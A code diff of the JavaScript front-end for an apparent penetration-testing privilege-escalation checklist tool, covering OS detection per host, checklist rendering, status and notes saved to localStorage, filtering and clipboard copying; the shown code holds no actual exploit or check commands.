-                const a = document.createElement('a');
-                a.href = link.url;
-                a.textContent = link.name;
-                a.target = '_blank'; // Ouvrir dans un nouvel onglet
-                a.rel = 'noopener noreferrer';
-                a.classList.add('me-2');
-                linksList.appendChild(a);
-            });
-            linksContainer.appendChild(linksList);
-            linksContainer.style.display = 'block';
-        } else {
-             linksContainer.style.display = 'none';
-        }
-
-        // Astuces
-        const tipsContainer = itemElement.querySelector('.checklist-tips');
-        const tipsParagraph = tipsContainer.querySelector('p');
-        if (itemData.tips) {
-            tipsParagraph.textContent = itemData.tips;
-            tipsContainer.style.display = 'block';
-        } else {
-            tipsContainer.style.display = 'none';
-        }
-
-        // Ajouter l'ID de l'item aux data-attributes du select et textarea pour identification facile
-        itemElement.querySelector('.checklist-status-select').dataset.itemId = itemData.id;
-        itemElement.querySelector('.checklist-notes-textarea').dataset.itemId = itemData.id;
-        itemElement.querySelectorAll('.copy-btn-inline').forEach(btn => btn.dataset.itemId = itemData.id);
-
-
-        return itemElement;
-    }
-
-    // --- Détection OS (Simpliste) ---
-    function detectOS(systemString) {
-        if (!systemString) return 'Linux'; // Défaut ? Ou 'Unknown' ?
-        const lowerSystem = systemString.toLowerCase();
-        if (lowerSystem.includes('linux')) return 'Linux';
-        if (lowerSystem.includes('windows')) return 'Windows';
-        if (lowerSystem.includes('domain controller')) return 'Active Directory'; // Ou combiner avec Windows ?
-        // Ajouter d'autres détections (macOS, BSD, etc.)
-        return 'Linux'; // Retour à un défaut
-    }
-
-    // --- Gestion des Interactions Checklist ---
-    function handleChecklistInteraction(event) {
-        const target = event.target;
-        const itemId = target.dataset.itemId;
-
-        if (!currentNodeId || !itemId) return; // Pas de node sélectionné ou item non identifié
-
-        // Changement de Statut
-        if (target.matches('.checklist-status-select')) {
-            const newStatus = target.value;
-            updateChecklistItemState(currentNodeId, itemId, { status: newStatus });
-            // Appliquer la classe de style au parent
-            const itemElement = target.closest('.checklist-item');
-            if (itemElement) {
-                 itemElement.classList.remove('status-checked', 'status-exploitable', 'status-exploited');
-                 if (newStatus !== 'todo') {
-                     itemElement.classList.add(`status-${newStatus}`);
-                 }
-            }
-        }
-        // Saisie de Notes
-        else if (target.matches('.checklist-notes-textarea')) {
-            // Utiliser un debounce serait mieux pour les perfs, mais simple pour l'instant
-             updateChecklistItemState(currentNodeId, itemId, { notes: target.value });
-        }
-        // Bouton Copier
-        else if (target.matches('.copy-btn-inline') || target.closest('.copy-btn-inline')) {
-             const button = target.closest('.copy-btn-inline');
-             const pre = button.closest('pre');
-             if (pre) {
-                 const code = pre.querySelector('code');
-                 if (code) {
-                     copyToClipboard(code.textContent, button);
-                 }
-             }
-        }
-    }
-
-     // --- Mise à jour de l'état d'un item ---
-     function updateChecklistItemState(nodeId, itemId, newState) {
-         if (!checklistState[nodeId]) {
-             checklistState[nodeId] = {};
-         }
-         if (!checklistState[nodeId][itemId]) {
-             checklistState[nodeId][itemId] = { status: 'todo', notes: '' };
-         }
-         // Fusionner le nouvel état
-         checklistState[nodeId][itemId] = { ...checklistState[nodeId][itemId], ...newState };
-         saveChecklistStateToStorage(); // Sauvegarder l'état global
-         // console.log(`State updated for ${nodeId} - ${itemId}:`, checklistState[nodeId][itemId]);
-     }
-
-    // --- Sauvegarde/Chargement de l'État Global ---
-    function saveChecklistStateToStorage() {
-        try {
-            localStorage.setItem(`privescChecklistState_v3`, JSON.stringify(checklistState));
-        } catch (e) {
-            console.error("Failed to save checklist state to localStorage:", e);
         }
     }
 
     function loadChecklistStateFromStorage() {
-        try {
-            const savedState = localStorage.getItem(`privescChecklistState_v3`);
-            if (savedState) {
-                checklistState = JSON.parse(savedState);
-                console.log("Global checklist state loaded from localStorage.");
-            } else {
+        console.log("Loading checklist state from localStorage...");
+        const storedState = localStorage.getItem(CHECKLIST_STORAGE_KEY);
+        if (storedState) {
+            try {
+                checklistState = JSON.parse(storedState);
+                console.log("Checklist state loaded:", checklistState);
+            } catch (error) {
+                console.error("Error parsing checklist state from localStorage:", error);
                 checklistState = {};
-                console.log("No saved global checklist state found.");
             }
-        } catch (e) {
-            console.error("Failed to load or parse checklist state from localStorage:", e);
+        } else {
+            console.log("No previous checklist state found.");
             checklistState = {};
         }
     }
 
-    // --- Chargement de l'État pour le Node Actif ---
-    function loadChecklistStateForNode(nodeId) {
-        const nodeState = checklistState[nodeId];
-        if (!nodeState) return;
+    // --- Mise à jour de l'UI ---
+    function populateNodeSelector() {
+        nodeSelect.innerHTML = '<option value="">-- Sélectionnez un Node --</option>';
+        nodeSelect.disabled = false;
 
-        console.log(`Loading state for node ${nodeId}`);
-        checklistContainer.querySelectorAll('.checklist-item').forEach(itemElement => {
-            const itemId = itemElement.dataset.itemId;
-            if (nodeState[itemId]) {
-                const itemState = nodeState[itemId];
-                const statusSelect = itemElement.querySelector('.checklist-status-select');
-                const notesTextarea = itemElement.querySelector('.checklist-notes-textarea');
+        if (!hostManagerData || !hostManagerData.categories) {
+            console.warn("populateNodeSelector: hostManagerData or categories missing.");
+            nodeSelect.disabled = true;
+            return;
+        }
 
-                if (statusSelect) {
-                    statusSelect.value = itemState.status || 'todo';
-                    // Appliquer la classe de style
-                    itemElement.classList.remove('status-checked', 'status-exploitable', 'status-exploited');
-                    if (itemState.status && itemState.status !== 'todo') {
-                        itemElement.classList.add(`status-${itemState.status}`);
-                    }
-                }
-                if (notesTextarea) {
-                    notesTextarea.value = itemState.notes || '';
-                }
+        let nodeCount = 0;
+        const sortedCategories = Object.keys(hostManagerData.categories).sort();
+
+        sortedCategories.forEach(categoryName => {
+            const category = hostManagerData.categories[categoryName];
+            if (category && category.hosts) {
+                const sortedHostIds = Object.keys(category.hosts).sort();
+                sortedHostIds.forEach(hostId => {
+                    const host = category.hosts[hostId];
+                    const option = document.createElement('option');
+                    option.value = hostId;
+                    let labelText = hostId;
+                    if (host.system) labelText += ` (${host.system})`;
+                    if (host.role) labelText += ` - ${host.role}`;
+                    option.textContent = labelText;
+                    nodeSelect.appendChild(option);
+                    nodeCount++;
+                });
             }
         });
+
+        if (nodeCount === 0) {
+             nodeSelect.innerHTML = '<option value="">Aucun node défini dans HostManager</option>';
+             nodeSelect.disabled = true;
+        }
     }
 
-    // --- Filtrage et Recherche ---
-     function populateTagFilter() {
-         checklistFilterTag.innerHTML = '<option value="">Tous les tags</option>';
-         const sortedTags = Array.from(availableTags).sort();
-         sortedTags.forEach(tag => {
-             const option = document.createElement('option');
-             option.value = tag;
-             option.textContent = tag;
-             checklistFilterTag.appendChild(option);
-         });
-     }
+    function displayInitialView() {
+        checklistContainer.innerHTML = '';
+        checklistPlaceholder.textContent = 'Sélectionnez un node pour afficher la checklist contextuelle.';
+        checklistPlaceholder.style.display = 'block';
+        activeNodeInfoEl.textContent = 'Aucun node sélectionné.';
+        checklistSearchInput.disabled = true;
+        checklistFilterStatus.disabled = true;
+        checklistFilterTag.disabled = true;
+        if(applyFiltersBtn) applyFiltersBtn.disabled = true;
+    }
+
+    function displayNodeInfo(hostId) {
+        const hostInfo = findHostInHostManagerData(hostId);
+        if (hostInfo && hostInfo.host) {
+            const host = hostInfo.host;
+            let infoText = `Node: ${hostId}`;
+            if (host.system) infoText += ` | OS: ${host.system}`;
+            if (host.role) infoText += ` | Rôle: ${host.role}`;
+            if (host.tags && host.tags.length > 0) infoText += ` | Tags: ${host.tags.join(', ')}`;
+            activeNodeInfoEl.textContent = infoText;
+            checklistSearchInput.disabled = false;
+            checklistFilterStatus.disabled = false;
+            checklistFilterTag.disabled = false;
+             if(applyFiltersBtn) applyFiltersBtn.disabled = false;
+        } else {
+            activeNodeInfoEl.textContent = `Node: ${hostId} (Détails non trouvés)`;
+            checklistSearchInput.disabled = true;
+            checklistFilterStatus.disabled = true;
+            checklistFilterTag.disabled = true;
+            if(applyFiltersBtn) applyFiltersBtn.disabled = true;
+        }
+    }
+
+    function renderChecklistForNode(hostId) {
+        currentNodeId = hostId;
+        console.log(`Rendering checklist for node: ${hostId}`);
+        displayNodeInfo(hostId);
+        checklistContainer.innerHTML = '';
+        availableTags.clear();
+
+        const osType = detectOS(hostId);
+        console.log(`Detected OS for ${hostId}: ${osType}`);
+
+        if (!osType || !CHECKLIST_DEFINITION[osType]) {
+            checklistPlaceholder.textContent = `Aucune checklist définie pour l'OS '${osType || 'Inconnu'}' ou node non trouvé.`;
+            checklistPlaceholder.style.display = 'block';
+            return;
+        }
+
+        checklistPlaceholder.style.display = 'none';
+        const categories = CHECKLIST_DEFINITION[osType];
+        const nodeChecklistState = checklistState[hostId] || {};
+
+        Object.keys(categories).sort().forEach(categoryName => {
+            const categoryHeader = document.createElement('h5');
+            categoryHeader.className = 'mt-4 mb-3 checklist-category-header';
+            categoryHeader.textContent = categoryName;
+            categoryHeader.dataset.categoryName = categoryName;
+            checklistContainer.appendChild(categoryHeader);
+
+            categories[categoryName].forEach(item => {
+                if (item.tags && Array.isArray(item.tags)) {
+                    item.tags.forEach(tag => availableTags.add(tag));
+                }
+                const itemElement = createChecklistItemElement(item, nodeChecklistState[item.id] || {});
+                checklistContainer.appendChild(itemElement);
+            });
+        });
+
+        populateTagFilter();
+        applyFilters();
+    }
+
+    function createChecklistItemElement(itemData, itemState) {
+        const templateClone = checklistItemTemplate.content.cloneNode(true);
+        const itemElement = templateClone.querySelector('.checklist-item');
+
+        itemElement.dataset.itemId = itemData.id;
+        itemElement.dataset.tags = itemData.tags ? itemData.tags.join(',') : '';
+
+        itemElement.querySelector('.checklist-label').textContent = itemData.label;
+        itemElement.querySelector('.checklist-description').textContent = itemData.description;
+
+        const statusSelect = itemElement.querySelector('.checklist-status-select');
+        statusSelect.value = itemState.status || 'todo';
+        itemElement.classList.add(`status-${statusSelect.value}`);
+
+        const checkCommandContainer = itemElement.querySelector('.check-command');
+        const checkCommandCode = checkCommandContainer.querySelector('code');
+        const checkCommandCopyBtn = checkCommandContainer.querySelector('.copy-btn-inline');
+        if (itemData.checkCommand) {
+            checkCommandCode.textContent = itemData.checkCommand;
+            checkCommandCopyBtn.dataset.clipboardText = itemData.checkCommand;
+        } else {
+            checkCommandContainer.style.display = 'none';
+        }
+
+        const exploitCommandContainer = itemElement.querySelector('.exploit-command');
+        const exploitCommandCode = exploitCommandContainer.querySelector('code');
+        const exploitCommandCopyBtn = exploitCommandContainer.querySelector('.copy-btn-inline');
+        if (itemData.exploitCommand) {
+            exploitCommandContainer.style.display = '';
+            exploitCommandCode.textContent = itemData.exploitCommand;
+            exploitCommandCopyBtn.dataset.clipboardText = itemData.exploitCommand;
+        } else {
+            exploitCommandContainer.style.display = 'none';
+        }
+
+        const linksContainer = itemElement.querySelector('.checklist-links');
+        if (itemData.links && itemData.links.length > 0) {
+            linksContainer.style.display = '';
+            const linksList = document.createElement('div');
+            itemData.links.forEach(link => {
+                const a = document.createElement('a');
+                a.href = link.url;
+                a.textContent = link.name || 'Lien';
+                a.target = '_blank';
+                a.rel = 'noopener noreferrer';
+                a.className = 'btn btn-outline-info btn-sm me-2 mb-1';
+                linksList.appendChild(a);
+            });
+            linksContainer.appendChild(linksList);
+        } else {
+            linksContainer.style.display = 'none';
+        }
+
+        const tipsContainer = itemElement.querySelector('.checklist-tips');
+        if (itemData.tips) {
+            tipsContainer.style.display = '';
+            tipsContainer.querySelector('p').textContent = itemData.tips;
+        } else {
+            tipsContainer.style.display = 'none';
+        }
+
+        const notesTextarea = itemElement.querySelector('.checklist-notes-textarea');
+        notesTextarea.value = itemState.notes || '';
+
+        return itemElement;
+    }
+
+    function findHostInHostManagerData(hostId) {
+        if (!hostManagerData || !hostManagerData.categories) return null;
+        for (const categoryName in hostManagerData.categories) {
+            const category = hostManagerData.categories[categoryName];
+            if (category.hosts && category.hosts[hostId]) {
+                return { host: category.hosts[hostId], category: categoryName };
+            }
+        }
+        return null;
+    }
+
+    function detectOS(hostId) {
+        const hostInfo = findHostInHostManagerData(hostId);
+        if (!hostInfo || !hostInfo.host) return 'Unknown';
+
+        const host = hostInfo.host;
+
+        if (host.tags && Array.isArray(host.tags)) {
+            const osTag = host.tags.find(tag => tag.toLowerCase().startsWith('os:'));
+            if (osTag) {
+                const detected = osTag.split(':')[1]?.trim().toLowerCase();
+                if (detected.includes('windows')) return 'Windows';
+                if (detected.includes('linux')) return 'Linux';
+            }
+        }
+
+        if (host.system) {
+            const systemLower = host.system.toLowerCase();
+            if (systemLower.includes('windows')) return 'Windows';
+            if (systemLower.includes('linux') || systemLower.includes('debian') || systemLower.includes('ubuntu') || systemLower.includes('centos') || systemLower.includes('fedora') || systemLower.includes('arch')) return 'Linux';
+        }
+
+        if (host.tags && Array.isArray(host.tags)) {
+            if (host.tags.some(tag => tag.toLowerCase() === 'ad' || tag.toLowerCase() === 'domain controller' || tag.toLowerCase() === 'dc')) {
+                return 'Active Directory';
+            }
+        }
+        if (host.role && host.role.toLowerCase().includes('domain controller')) {
+             return 'Active Directory';
+        }
+
+        const categoryNameLower = hostInfo.category.toLowerCase();
+        if (categoryNameLower.includes('windows')) return 'Windows';
+        if (categoryNameLower.includes('linux')) return 'Linux';
+        if (categoryNameLower.includes('ad') || categoryNameLower.includes('active directory')) return 'Active Directory';
+
+        console.warn(`Could not reliably detect OS for ${hostId}. Defaulting to 'Unknown'.`);
+        return 'Unknown';
+    }
+
+    function updateChecklistItemState(itemId, newStatus, newNotes) {
+        if (!currentNodeId) return;
+
+        if (!checklistState[currentNodeId]) {
+            checklistState[currentNodeId] = {};
+        }
+        if (!checklistState[currentNodeId][itemId]) {
+            checklistState[currentNodeId][itemId] = {};
+        }
+
+        checklistState[currentNodeId][itemId].status = newStatus;
+        checklistState[currentNodeId][itemId].notes = newNotes;
+
+        console.log(`State updated for Node ${currentNodeId}, Item ${itemId}:`, checklistState[currentNodeId][itemId]);
+        saveChecklistStateToStorage();
+    }
+
+    function populateTagFilter() {
+        const previousValue = checklistFilterTag.value;
+        checklistFilterTag.innerHTML = '<option value="">Tous les tags</option>';
+        const sortedTags = Array.from(availableTags).sort((a, b) => a.localeCompare(b));
+        sortedTags.forEach(tag => {
+            const option = document.createElement('option');
+            option.value = tag;
+            option.textContent = tag.charAt(0).toUpperCase() + tag.slice(1);
+            checklistFilterTag.appendChild(option);
+        });
+        if (Array.from(checklistFilterTag.options).some(opt => opt.value === previousValue)) {
+           checklistFilterTag.value = previousValue;
+        }
+    }
 
     function applyFilters() {
-        if (!currentNodeId) return; // Ne pas filtrer si aucun node n'est sélectionné
+        if (!currentNodeId) return;
 
         const searchTerm = checklistSearchInput.value.toLowerCase().trim();
-        const filterStatus = checklistFilterStatus.value;
-        const filterTag = checklistFilterTag.value;
+        const selectedStatus = checklistFilterStatus.value;
+        const selectedTag = checklistFilterTag.value;
 
-        console.log(`Applying filters: Search='${searchTerm}', Status='${filterStatus}', Tag='${filterTag}'`);
+        let visibleItems = 0;
+        let visibleCategories = new Set();
 
-        let visibleCount = 0;
         checklistContainer.querySelectorAll('.checklist-item').forEach(itemElement => {
-            const itemId = itemElement.dataset.itemId;
-            const itemState = checklistState[currentNodeId]?.[itemId] || { status: 'todo' };
-            const itemTags = itemElement.dataset.tags.split(',');
+            const label = itemElement.querySelector('.checklist-label')?.textContent.toLowerCase() || '';
+            const description = itemElement.querySelector('.checklist-description')?.textContent.toLowerCase() || '';
+            const notes = itemElement.querySelector('.checklist-notes-textarea')?.value.toLowerCase() || '';
+            const checkCommand = itemElement.querySelector('.check-command pre code')?.textContent.toLowerCase() || '';
+            const exploitCommand = itemElement.querySelector('.exploit-command pre code')?.textContent.toLowerCase() || '';
+            const itemTags = (itemElement.dataset.tags || '').split(',');
+            const itemStatus = itemElement.querySelector('.checklist-status-select')?.value || 'todo';
 
-            // Vérification Statut
-            let statusMatch = true;
-            if (filterStatus && itemState.status !== filterStatus) {
-                statusMatch = false;
-            }
+            const matchesSearch = !searchTerm || label.includes(searchTerm) || description.includes(searchTerm) || notes.includes(searchTerm) || checkCommand.includes(searchTerm) || exploitCommand.includes(searchTerm);
+            const matchesStatus = !selectedStatus || itemStatus === selectedStatus;
+            const matchesTag = !selectedTag || itemTags.includes(selectedTag);
 
-            // Vérification Tag
-            let tagMatch = true;
-            if (filterTag && !itemTags.includes(filterTag)) {
-                tagMatch = false;
-            }
-
-            // Vérification Terme de Recherche (dans label, description, commandes, notes)
-            let searchMatch = true;
-            if (searchTerm) {
-                const label = itemElement.querySelector('.checklist-label')?.textContent.toLowerCase() || '';
-                const description = itemElement.querySelector('.checklist-description')?.textContent.toLowerCase() || '';
-                const checkCmd = itemElement.querySelector('.check-command code')?.textContent.toLowerCase() || '';
-                const exploitCmd = itemElement.querySelector('.exploit-command code')?.textContent.toLowerCase() || '';
-                const notes = itemElement.querySelector('.checklist-notes-textarea')?.value.toLowerCase() || '';
-                searchMatch = label.includes(searchTerm) ||
-                              description.includes(searchTerm) ||
-                              checkCmd.includes(searchTerm) ||
-                              exploitCmd.includes(searchTerm) ||
-                              notes.includes(searchTerm);
-            }
-
-            // Afficher ou masquer
-            if (statusMatch && tagMatch && searchMatch) {
+            if (matchesSearch && matchesStatus && matchesTag) {
                 itemElement.style.display = '';
-                visibleCount++;
+                visibleItems++;
+                let currentElement = itemElement;
+                while (currentElement && currentElement.previousElementSibling) {
+                    currentElement = currentElement.previousElementSibling;
+                    if (currentElement.matches('.checklist-category-header')) {
+                        visibleCategories.add(currentElement.dataset.categoryName);
+                        break;
+                    }
+                }
             } else {
                 itemElement.style.display = 'none';
             }
         });
-         console.log(`${visibleCount} items visible after filtering.`);
-         if (visibleCount === 0 && checklistContainer.children.length > 0) {
-              checklistPlaceholder.textContent = 'Aucun item ne correspond aux filtres actuels.';
-              checklistPlaceholder.style.display = 'block';
-         } else if (checklistContainer.children.length > 0) {
-              checklistPlaceholder.style.display = 'none';
-         }
+
+        checklistContainer.querySelectorAll('.checklist-category-header').forEach(header => {
+            if (visibleCategories.has(header.dataset.categoryName)) {
+                header.style.display = '';
+            } else {
+                header.style.display = 'none';
+            }
+        });
+
+        if (visibleItems === 0 && checklistContainer.children.length > 1) {
+            const hasItems = Array.from(checklistContainer.children).some(el => el.matches('.checklist-item'));
+            if (hasItems) {
+                 checklistPlaceholder.textContent = 'Aucun item ne correspond aux filtres sélectionnés.';
+                 checklistPlaceholder.style.display = 'block';
+            }
+        } else if (checklistContainer.children.length > 1) {
+             checklistPlaceholder.style.display = 'none';
+        } else {
+             if (!currentNodeId) {
+                 checklistPlaceholder.textContent = 'Sélectionnez un node pour afficher la checklist contextuelle.';
+                 checklistPlaceholder.style.display = 'block';
+             } else {
+                  const osType = detectOS(currentNodeId);
+                  if (!CHECKLIST_DEFINITION[osType]) {
+                       checklistPlaceholder.textContent = `Aucune checklist définie pour l'OS '${osType || 'Inconnu'}'.`;
+                       checklistPlaceholder.style.display = 'block';
+                  } else {
+                       checklistPlaceholder.style.display = 'none';
+                  }
+             }
+        }
     }
 
-    // --- Fonction Copier (Adaptée pour bouton inline) ---
     function copyToClipboard(text, buttonElement) {
+        if (!text) return;
         navigator.clipboard.writeText(text).then(() => {
-            const originalIcon = buttonElement.innerHTML;
+            const originalContent = buttonElement.innerHTML;
             buttonElement.innerHTML = '<i class="fas fa-check text-success"></i>';
+            buttonElement.disabled = true;
             setTimeout(() => {
-                buttonElement.innerHTML = originalIcon;
+                buttonElement.innerHTML = originalContent;
+                buttonElement.disabled = false;
             }, 1500);
         }).catch(err => {
-            console.error('Failed to copy text: ', err);
-            const originalIcon = buttonElement.innerHTML;
+            console.error('Erreur lors de la copie :', err);
+            const originalContent = buttonElement.innerHTML;
             buttonElement.innerHTML = '<i class="fas fa-times text-danger"></i>';
              setTimeout(() => {
-                buttonElement.innerHTML = originalIcon;
+                buttonElement.innerHTML = originalContent;
             }, 1500);
         });
     }
 
-    // --- Lancement ---
+    function setupEventListeners() {
+        nodeSelect.addEventListener('change', (e) => {
+            const selectedNodeId = e.target.value;
+            if (selectedNodeId) {
+                renderChecklistForNode(selectedNodeId);
+            } else {
+                currentNodeId = null;
+                displayInitialView();
+            }
+        });
+
+        if (applyFiltersBtn) {
+            applyFiltersBtn.addEventListener('click', applyFilters);
+        } else {
+             console.warn("Bouton 'apply-checklist-filters' non trouvé. Activation du filtrage direct.");
+             checklistSearchInput.addEventListener('input', applyFilters);
+             checklistFilterStatus.addEventListener('change', applyFilters);
+             checklistFilterTag.addEventListener('change', applyFilters);
+        }
+
+        checklistContainer.addEventListener('click', (event) => {
+            if (event.target.closest('.copy-btn-inline')) {
+                const button = event.target.closest('.copy-btn-inline');
+                const textToCopy = button.dataset.clipboardText;
+                if (textToCopy) {
+                    copyToClipboard(textToCopy, button);
+                }
+            }
+        });
+
+        checklistContainer.addEventListener('change', (event) => {
+            if (event.target.matches('.checklist-status-select')) {
+                const selectElement = event.target;
+                const itemElement = selectElement.closest('.checklist-item');
+                const itemId = itemElement.dataset.itemId;
+                const newStatus = selectElement.value;
+                const notesTextarea = itemElement.querySelector('.checklist-notes-textarea');
+                const currentNotes = notesTextarea ? notesTextarea.value : '';
+
+                itemElement.className = itemElement.className.replace(/status-\w+/g, '');
+                itemElement.classList.add(`status-${newStatus}`);
+
+                updateChecklistItemState(itemId, newStatus, currentNotes);
+            }
+        });
+
+        checklistContainer.addEventListener('input', (event) => {
+             if (event.target.matches('.checklist-notes-textarea')) {
+                 const notesTextarea = event.target;
+                 const itemElement = notesTextarea.closest('.checklist-item');
+                 const itemId = itemElement.dataset.itemId;
+                 const newNotes = notesTextarea.value;
+                 const statusSelect = itemElement.querySelector('.checklist-status-select');
+                 const currentStatus = statusSelect ? statusSelect.value : 'todo';
+
+                 updateChecklistItemState(itemId, currentStatus, newNotes);
+             }
+        });
+    }
+
     initialize();
-
-});
-
-// IMPORTANT: Les anciennes fonctions comme parseOutputContent, parseSudoL, parseSuid,
-// displayExploitationGuide, renderSuggestions, etc. sont SUPPRIMÉES.
-// Toute la logique est maintenant centrée sur la génération et l'interaction
-// avec la checklist dynamique basée sur CHECKLIST_DEFINITION et l'état sauvegardé. 
+}); 
